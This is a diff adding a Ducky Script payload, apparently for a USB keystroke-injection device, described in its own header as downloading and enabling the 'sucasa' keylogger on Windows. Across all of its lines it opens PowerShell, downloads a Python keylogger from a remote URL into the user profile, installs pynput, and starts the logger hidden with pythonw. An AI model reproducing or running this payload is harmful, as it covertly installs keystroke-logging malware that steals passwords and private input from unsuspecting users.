@@ -1,0 +1,29 @@
+REM Author: JAM
+REM Description: Downloads and enables the sucasa keylogger on windows
+REM Version: 1.0
+REM Category: Execution
+GUI r
+DELAY 2000
+STRING powershell
+ENTER
+DELAY 4000
+STRING $source = "https://github.com/JessiMcKissick/sucasa-keylogger/releases/download/betas/sucasa.py"
+ENTER
+DELAY 1000
+STRING $destination = "$env:USERPROFILE\sucasa.py"
+ENTER
+DELAY 1000
+STRING $client = new-object System.Net.WebClient
+ENTER
+DELAY 1000
+STRING $client.DownloadFile($source,$destination)
+ENTER
+DELAY 1000
+STRING pip install pynput
+ENTER
+DELAY 3000
+STRING Start-Process -NoNewWindow pythonw $env:USERPROFILE\sucasa.py
+ENTER
+DELAY 1000
+STRING exit
+ENTER
